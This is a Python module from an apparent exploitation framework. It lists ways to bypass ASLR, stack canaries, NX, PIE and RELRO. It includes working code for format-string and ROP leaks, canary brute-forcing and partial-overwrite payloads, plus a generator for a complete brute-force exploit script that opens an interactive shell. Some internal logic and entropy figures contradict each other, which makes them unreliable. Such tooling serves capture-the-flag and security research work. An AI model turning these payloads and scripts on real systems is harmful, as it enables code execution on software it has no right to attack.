"""
Protection bypass strategies.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class BypassStrategy:
    """A protection bypass strategy."""
    name: str
    protection: str
    description: str
    requirements: List[str] = field(default_factory=list)
    success_rate: float = 0.0


class ProtectionBypass:
    """
    Strategies for bypassing modern protections.

    Covers:
    - ASLR bypass (leaks, brute force, partial overwrite)
    - Stack canary bypass (leak, brute force)
    - NX bypass (ROP, ret2libc, mprotect)
    - PIE bypass (partial overwrite, leak)
    - RELRO bypass (hooks, return address)
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize bypass strategies.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.binary = context.binary
        self.bits = context.bits
        self.pack = p64 if self.bits == 64 else p32

    def get_applicable_strategies(self) -> List[BypassStrategy]:
        """
        Get applicable bypass strategies for current context.

        Returns:
            List of applicable strategies
        """
        strategies = []
        prots = self.context.protections

        if prots.aslr:
            strategies.extend(self._get_aslr_strategies())

        if prots.canary:
            strategies.extend(self._get_canary_strategies())

        if prots.nx:
            strategies.extend(self._get_nx_strategies())

        if prots.pie:
            strategies.extend(self._get_pie_strategies())

        if prots.relro in ["Partial RELRO", "Full RELRO"]:
            strategies.extend(self._get_relro_strategies())

        return strategies

    def _get_aslr_strategies(self) -> List[BypassStrategy]:
        """Get ASLR bypass strategies."""
        return [
            BypassStrategy(
                name="information_leak",
                protection="ASLR",
                description="Leak libc/stack/heap address to defeat ASLR",
                requirements=["Format string or buffer read primitive"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="partial_overwrite",
                protection="ASLR",
                description="Overwrite only lower bytes (12-bit entropy)",
                requirements=["Buffer overflow with 2+ byte control"],
                success_rate=1.0 / 4096,  # 12-bit brute force
            ),
            BypassStrategy(
                name="brute_force_32bit",
                protection="ASLR",
                description="Brute force 32-bit ASLR (8-bit entropy)",
                requirements=["32-bit system", "Crash tolerance"],
                success_rate=1.0 / 256,
            ),
            BypassStrategy(
                name="ret2plt",
                protection="ASLR",
                description="Use PLT entries (fixed addresses without PIE)",
                requirements=["PIE disabled", "Useful PLT functions"],
                success_rate=0.99,
            ),
            BypassStrategy(
                name="ret2dlresolve",
                protection="ASLR",
                description="Resolve arbitrary function without leak",
                requirements=["Stack control", "Writable memory"],
                success_rate=0.85,
            ),
        ]

    def _get_canary_strategies(self) -> List[BypassStrategy]:
        """Get canary bypass strategies."""
        return [
            BypassStrategy(
                name="leak_canary",
                protection="Canary",
                description="Leak canary via format string or buffer over-read",
                requirements=["Information disclosure primitive"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="brute_force_canary",
                protection="Canary",
                description="Brute force canary byte-by-byte (fork servers)",
                requirements=["Fork-based server", "Byte-by-byte overflow"],
                success_rate=0.99,  # 256 * 7 attempts for 64-bit
            ),
            BypassStrategy(
                name="overwrite_canary",
                protection="Canary",
                description="Overwrite canary with itself (if known)",
                requirements=["Canary value known"],
                success_rate=1.0,
            ),
            BypassStrategy(
                name="thread_local_overwrite",
                protection="Canary",
                description="Overwrite TLS canary reference",
                requirements=["Large overflow", "Known TLS offset"],
                success_rate=0.7,
            ),
        ]

    def _get_nx_strategies(self) -> List[BypassStrategy]:
        """Get NX bypass strategies."""
        return [
            BypassStrategy(
                name="rop_chain",
                protection="NX",
                description="Use ROP gadgets for code execution",
                requirements=["Stack control", "Available gadgets"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="ret2libc",
                protection="NX",
                description="Return to libc functions (system, execve)",
                requirements=["Libc address", "Argument control"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="mprotect",
                protection="NX",
                description="Call mprotect to make memory executable",
                requirements=["Control of mprotect args", "Stack for shellcode"],
                success_rate=0.85,
            ),
            BypassStrategy(
                name="jit_spray",
                protection="NX",
                description="Spray JIT-compiled code (browsers)",
                requirements=["JIT engine", "Controllable JIT input"],
                success_rate=0.6,
            ),
        ]

    def _get_pie_strategies(self) -> List[BypassStrategy]:
        """Get PIE bypass strategies."""
        return [
            BypassStrategy(
                name="leak_binary_base",
                protection="PIE",
                description="Leak binary address to calculate base",
                requirements=["Information leak primitive"],
                success_rate=0.95,
            ),
            BypassStrategy(
                name="partial_overwrite_pie",
                protection="PIE",
                description="Partial overwrite (page-aligned targets)",
                requirements=["Overflow with 1-2 byte control"],
                success_rate=1.0 / 4096,
            ),
            BypassStrategy(
                name="relative_addressing",
                protection="PIE",
                description="Use relative offsets instead of absolute",
                requirements=["Control of relative offset"],
                success_rate=0.9,
            ),
        ]

    def _get_relro_strategies(self) -> List[BypassStrategy]:
        """Get RELRO bypass strategies."""
        full = self.context.protections.relro == "Full RELRO"

        strategies = []

        if not full:
            strategies.append(BypassStrategy(
                name="got_overwrite",
                protection="Partial RELRO",
                description="Overwrite GOT entry to hijack function",
                requirements=["Arbitrary write primitive"],
                success_rate=0.95,
            ))

        strategies.extend([
            BypassStrategy(
                name="malloc_hook",
                protection="Full RELRO",
                description="Overwrite __malloc_hook (deprecated but still works)",
                requirements=["Libc address", "Write primitive"],
                success_rate=0.9,
            ),
            BypassStrategy(
                name="free_hook",
                protection="Full RELRO",
                description="Overwrite __free_hook",
                requirements=["Libc address", "Write primitive"],
                success_rate=0.9,
            ),
            BypassStrategy(
                name="exit_handlers",
                protection="Full RELRO",
                description="Overwrite __exit_funcs or TLS dtors",
                requirements=["Libc address", "Write primitive"],
                success_rate=0.8,
            ),
            BypassStrategy(
                name="return_address",
                protection="Full RELRO",
                description="Overwrite return address on stack",
                requirements=["Stack buffer overflow"],
                success_rate=0.95,
            ),
        ])

        return strategies

    def leak_libc_address(
        self,
        method: str = "format_string",
    ) -> Dict[str, Any]:
        """
        Build payload to leak libc address.

        Args:
            method: Leak method (format_string, puts, write)

        Returns:
            Leak strategy info
        """
        result = {
            "method": method,
            "payload": b"",
            "parse_func": None,
        }

        if method == "format_string":
            # Leak with %p
            result["payload"] = b"%p." * 20 + b"\n"
            result["parse_func"] = self._parse_format_leak

        elif method == "puts":
            # Use puts to leak GOT entry
            if self.binary and "puts" in self.binary.plt:
                puts_plt = self.binary.plt["puts"]
                puts_got = self.binary.got.get("puts", 0)

                result["payload"] = self._build_puts_leak(puts_plt, puts_got)

        return result

    def _parse_format_leak(self, output: bytes) -> List[int]:
        """Parse format string leak output."""
        addresses = []
        for part in output.split(b"."):
            if part.startswith(b"0x"):
                try:
                    addr = int(part, 16)
                    if addr > 0x1000:  # Filter small values
                        addresses.append(addr)
                except ValueError:
                    continue
        return addresses

    def _build_puts_leak(self, puts_plt: int, target_got: int) -> bytes:
        """Build ROP chain to leak with puts."""
        chain = []

        # Find pop rdi gadget
        from supwngo.exploit.rop.gadgets import GadgetFinder
        finder = GadgetFinder(self.binary)
        pop_rdi = finder.find_pop_reg("rdi")

        if pop_rdi:
            chain.append(self.pack(pop_rdi.address))
            chain.append(self.pack(target_got))
            chain.append(self.pack(puts_plt))

        return b"".join(chain)

    def brute_force_canary(
        self,
        overflow_func: callable,
        offset: int,
    ) -> Optional[int]:
        """
        Brute force stack canary byte-by-byte.

        Args:
            overflow_func: Function to send overflow payload
            offset: Offset to canary

        Returns:
            Canary value or None
        """
        canary = bytearray(8 if self.bits == 64 else 4)
        canary[0] = 0x00  # Canaries start with null byte

        for i in range(1, len(canary)):
            for byte in range(256):
                canary[i] = byte
                payload = b"A" * offset + bytes(canary[:i + 1])

                try:
                    result = overflow_func(payload)
                    if result:  # Process didn't crash
                        break
                except Exception:
                    continue
            else:
                logger.warning(f"Failed to find canary byte {i}")
                return None

        return int.from_bytes(canary, 'little')

    def partial_overwrite(
        self,
        target_offset: int,
        new_low_bytes: bytes,
    ) -> bytes:
        """
        Build partial overwrite payload.

        Args:
            target_offset: Offset to target address
            new_low_bytes: New low bytes (1-2 bytes)

        Returns:
            Payload bytes
        """
        return b"A" * target_offset + new_low_bytes

    def calculate_libc_base(
        self,
        leaked_addr: int,
        symbol: str,
    ) -> Optional[int]:
        """
        Calculate libc base from leaked address.

        Args:
            leaked_addr: Leaked libc address
            symbol: Symbol name for leaked address

        Returns:
            Libc base address or None
        """
        if not self.context.libc.path:
            return None

        try:
            from pwn import ELF
            libc = ELF(str(self.context.libc.path))
            offset = libc.symbols.get(symbol, 0)
            if offset:
                return leaked_addr - offset
        except Exception:
            pass

        return None

    def suggest_best_strategy(self) -> Optional[BypassStrategy]:
        """
        Suggest best bypass strategy for current context.

        Returns:
            Best strategy or None
        """
        strategies = self.get_applicable_strategies()

        if not strategies:
            return None

        # Sort by success rate
        strategies.sort(key=lambda s: s.success_rate, reverse=True)

        return strategies[0]

    def summary(self) -> str:
        """Get bypass summary."""
        strategies = self.get_applicable_strategies()

        lines = [
            "Protection Bypass Summary",
            "=" * 40,
            f"Protections active:",
            f"  ASLR: {self.context.protections.aslr}",
            f"  Canary: {self.context.protections.canary}",
            f"  NX: {self.context.protections.nx}",
            f"  PIE: {self.context.protections.pie}",
            f"  RELRO: {self.context.protections.relro}",
            "",
            f"Applicable strategies: {len(strategies)}",
        ]

        for s in strategies[:5]:
            lines.append(f"  - {s.name} ({s.protection}): {s.success_rate:.1%}")

        return "\n".join(lines)


@dataclass
class PartialOverwriteResult:
    """Result of a partial overwrite attempt."""
    success: bool
    payload: bytes
    target_address: int
    overwritten_bytes: int
    attempts_needed: int = 0
    description: str = ""


class PartialOverwrite:
    """
    Partial overwrite bypass for PIE/ASLR.

    When PIE is enabled, addresses are randomized but only the upper bits.
    The lower 12 bits (page offset) remain constant. By overwriting only
    the lower 1-3 bytes of an address, we can redirect execution without
    needing a full leak.

    Key concepts:
    - Page offset (12 bits): Always constant, no randomization
    - 16-bit overwrite: 4 bits random = 1/16 success rate
    - 24-bit overwrite: 12 bits random = 1/4096 success rate

    Common scenarios:
    - Redirect return address to nearby function
    - Overwrite GOT entry's low bytes to redirect to PLT
    - Change function pointer within same page

    Example usage:
        partial = PartialOverwrite(binary, context)

        # Calculate target with 2-byte overwrite
        payload = partial.build_partial_payload(
            overflow_offset=64,
            original_target=0x555555554000,  # Original return addr
            new_target=0x555555554123,        # Target function
            overwrite_bytes=2,
        )

        # Brute force with 12-bit entropy
        for i in range(4096):
            p = process('./vuln')
            p.send(payload)
            try:
                p.recvline(timeout=0.5)
                print(f"Success on attempt {i}!")
                break
            except:
                p.close()
    """

    def __init__(
        self,
        binary: Binary,
        context: Optional[ExploitContext] = None,
    ):
        """
        Initialize partial overwrite handler.

        Args:
            binary: Target binary
            context: Optional exploitation context
        """
        self.binary = binary
        self.context = context
        self.bits = binary.bits
        self.pack = p64 if self.bits == 64 else p32
        self.word_size = 8 if self.bits == 64 else 4

    def calculate_entropy(self, overwrite_bytes: int) -> Tuple[int, float]:
        """
        Calculate entropy and success probability for partial overwrite.

        Args:
            overwrite_bytes: Number of bytes to overwrite (1-3)

        Returns:
            Tuple of (random bits, success probability)
        """
        # Page offset is 12 bits (0xFFF), always constant
        # Each additional byte beyond page offset adds 8 random bits

        if overwrite_bytes == 1:
            # Only low byte, all within page offset
            return 0, 1.0

        elif overwrite_bytes == 2:
            # 16 bits total, 12 constant = 4 random bits
            random_bits = 4
            return random_bits, 1.0 / (2 ** random_bits)

        elif overwrite_bytes == 3:
            # 24 bits total, 12 constant = 12 random bits
            random_bits = 12
            return random_bits, 1.0 / (2 ** random_bits)

        else:
            # More bytes = more entropy
            random_bits = (overwrite_bytes * 8) - 12
            if random_bits < 0:
                random_bits = 0
            return random_bits, 1.0 / (2 ** random_bits) if random_bits > 0 else 1.0

    def get_low_bytes(self, address: int, num_bytes: int) -> bytes:
        """
        Extract the low N bytes from an address.

        Args:
            address: Full address
            num_bytes: Number of low bytes to extract

        Returns:
            Low bytes as little-endian bytes
        """
        mask = (1 << (num_bytes * 8)) - 1
        low_value = address & mask
        return low_value.to_bytes(num_bytes, 'little')

    def can_reach_target(
        self,
        current_address: int,
        target_address: int,
        overwrite_bytes: int,
    ) -> bool:
        """
        Check if target is reachable with given number of overwrite bytes.

        Args:
            current_address: Current value being overwritten
            target_address: Desired target address
            overwrite_bytes: Number of bytes we can overwrite

        Returns:
            True if target is reachable
        """
        # Mask for the bytes we're NOT overwriting
        preserved_bits = (self.word_size - overwrite_bytes) * 8
        high_mask = ((1 << preserved_bits) - 1) << (overwrite_bytes * 8)

        current_high = current_address & high_mask
        target_high = target_address & high_mask

        # Target is reachable if high bytes match
        return current_high == target_high

    def find_reachable_targets(
        self,
        base_address: int,
        overwrite_bytes: int,
        target_symbols: Optional[List[str]] = None,
    ) -> List[Tuple[str, int]]:
        """
        Find symbols reachable with partial overwrite from base address.

        Args:
            base_address: Current address (e.g., return address)
            overwrite_bytes: Number of bytes to overwrite
            target_symbols: Specific symbols to check, or None for all

        Returns:
            List of (symbol_name, address) tuples that are reachable
        """
        reachable = []

        symbols_to_check = {}
        if target_symbols:
            for name in target_symbols:
                if name in self.binary.symbols:
                    symbols_to_check[name] = self.binary.symbols[name].address
                elif name in self.binary.plt:
                    symbols_to_check[name] = self.binary.plt[name]
        else:
            # Check all symbols
            for name, sym in self.binary.symbols.items():
                symbols_to_check[name] = sym.address
            symbols_to_check.update(self.binary.plt)

        for name, addr in symbols_to_check.items():
            if self.can_reach_target(base_address, addr, overwrite_bytes):
                reachable.append((name, addr))

        return reachable

    def build_partial_payload(
        self,
        overflow_offset: int,
        new_target: int,
        overwrite_bytes: int,
        padding: bytes = b"A",
    ) -> bytes:
        """
        Build payload with partial address overwrite.

        Args:
            overflow_offset: Offset to the address being overwritten
            new_target: Target address (only low bytes used)
            overwrite_bytes: Number of bytes to overwrite (1-3)
            padding: Padding byte

        Returns:
            Payload bytes
        """
        payload = bytearray()
        payload.extend(padding * overflow_offset)
        payload.extend(self.get_low_bytes(new_target, overwrite_bytes))

        return bytes(payload)

    def build_got_partial_overwrite(
        self,
        got_entry: str,
        target_plt: str,
        write_primitive: callable,
    ) -> PartialOverwriteResult:
        """
        Build partial overwrite for GOT entry redirection.

        Useful when:
        - Full RELRO is not enabled
        - We have arbitrary write but no leak
        - Target PLT entry is within 1-2 bytes of GOT resolved address

        Args:
            got_entry: GOT entry to overwrite (e.g., 'puts')
            target_plt: PLT entry to redirect to (e.g., 'system')
            write_primitive: Function to write bytes at address

        Returns:
            PartialOverwriteResult with status
        """
        if got_entry not in self.binary.got:
            return PartialOverwriteResult(
                success=False,
                payload=b"",
                target_address=0,
                overwritten_bytes=0,
                description=f"GOT entry '{got_entry}' not found",
            )

        if target_plt not in self.binary.plt:
            return PartialOverwriteResult(
                success=False,
                payload=b"",
                target_address=0,
                overwritten_bytes=0,
                description=f"PLT entry '{target_plt}' not found",
            )

        got_addr = self.binary.got[got_entry]
        plt_addr = self.binary.plt[target_plt]

        # PLT addresses are typically within binary's address space
        # Calculate how many bytes needed
        for num_bytes in [1, 2, 3]:
            low_bytes = self.get_low_bytes(plt_addr, num_bytes)
            entropy, prob = self.calculate_entropy(num_bytes)

            return PartialOverwriteResult(
                success=True,
                payload=low_bytes,
                target_address=plt_addr,
                overwritten_bytes=num_bytes,
                attempts_needed=int(1 / prob) if prob < 1.0 else 1,
                description=f"Overwrite {got_entry}@GOT with {num_bytes} bytes "
                           f"to redirect to {target_plt}@PLT (entropy: {entropy} bits)",
            )

        return PartialOverwriteResult(
            success=False,
            payload=b"",
            target_address=0,
            overwritten_bytes=0,
            description="Could not calculate partial overwrite",
        )

    def brute_force_partial(
        self,
        process_factory: callable,
        payload: bytes,
        success_checker: callable,
        max_attempts: int = 4096,
        verbose: bool = False,
    ) -> Tuple[bool, int]:
        """
        Brute force partial overwrite until success.

        Args:
            process_factory: Function that returns a new process/connection
            payload: Payload with partial overwrite
            success_checker: Function(process) -> bool to check success
            max_attempts: Maximum brute force attempts
            verbose: Print progress

        Returns:
            Tuple of (success, attempts)
        """
        for attempt in range(max_attempts):
            try:
                proc = process_factory()
                proc.send(payload)

                if success_checker(proc):
                    if verbose:
                        logger.info(f"Success on attempt {attempt + 1}")
                    return True, attempt + 1

                proc.close()

            except Exception as e:
                if verbose and attempt % 100 == 0:
                    logger.debug(f"Attempt {attempt}: {e}")

            if verbose and attempt % 500 == 0:
                logger.info(f"Attempt {attempt}/{max_attempts}...")

        return False, max_attempts

    def generate_brute_force_script(
        self,
        binary_path: str,
        overflow_offset: int,
        target_address: int,
        overwrite_bytes: int,
    ) -> str:
        """
        Generate Python script for brute-forcing partial overwrite.

        Args:
            binary_path: Path to vulnerable binary
            overflow_offset: Offset to overwrite location
            target_address: Target address
            overwrite_bytes: Number of bytes to overwrite

        Returns:
            Python exploit script as string
        """
        entropy, prob = self.calculate_entropy(overwrite_bytes)
        max_attempts = int(1 / prob) * 2 if prob < 1.0 else 1  # 2x expected attempts

        script = f'''#!/usr/bin/env python3
"""
Partial overwrite brute-force exploit.

Target: {binary_path}
Overwrite bytes: {overwrite_bytes}
Entropy: {entropy} bits
Expected attempts: ~{int(1/prob) if prob < 1.0 else 1}
Success probability: {prob:.6f}
"""

from pwn import *
import sys

context.log_level = 'error'

BINARY = "{binary_path}"
OFFSET = {overflow_offset}
TARGET = {target_address:#x}
OVERWRITE_BYTES = {overwrite_bytes}
MAX_ATTEMPTS = {max_attempts}

def get_low_bytes(addr: int, n: int) -> bytes:
    """Extract low N bytes from address."""
    mask = (1 << (n * 8)) - 1
    return (addr & mask).to_bytes(n, 'little')

def build_payload() -> bytes:
    """Build partial overwrite payload."""
    payload = b"A" * OFFSET
    payload += get_low_bytes(TARGET, OVERWRITE_BYTES)
    return payload

def check_success(p) -> bool:
    """Check if exploit succeeded."""
    try:
        # Customize this based on target behavior
        p.recvline(timeout=0.5)
        return True
    except:
        return False

def main():
    payload = build_payload()
    print(f"[*] Payload length: {{len(payload)}}")
    print(f"[*] Target: {{TARGET:#x}}")
    print(f"[*] Starting brute force (max {{MAX_ATTEMPTS}} attempts)...")

    for i in range(MAX_ATTEMPTS):
        try:
            p = process(BINARY)
            p.send(payload)

            if check_success(p):
                print(f"[+] SUCCESS on attempt {{i+1}}!")
                p.interactive()
                return

            p.close()

        except Exception as e:
            pass

        if i % 100 == 0:
            print(f"[*] Attempt {{i}}/{{MAX_ATTEMPTS}}...", end="\\r")

    print(f"[-] Failed after {{MAX_ATTEMPTS}} attempts")

if __name__ == "__main__":
    main()
'''
        return script

    def summary(self) -> str:
        """Get partial overwrite summary for current binary."""
        lines = [
            "Partial Overwrite Analysis",
            "=" * 40,
            f"Binary: {self.binary.path.name}",
            f"PIE: {self.binary.protections.pie}",
            "",
            "Entropy by overwrite size:",
        ]

        for num_bytes in [1, 2, 3]:
            entropy, prob = self.calculate_entropy(num_bytes)
            lines.append(f"  {num_bytes} byte(s): {entropy} random bits, "
                        f"~{int(1/prob) if prob < 1.0 else 1} attempts")

        return "\n".join(lines)


__all__ = [
    "BypassStrategy",
    "ProtectionBypass",
    "PartialOverwriteResult",
    "PartialOverwrite",
]
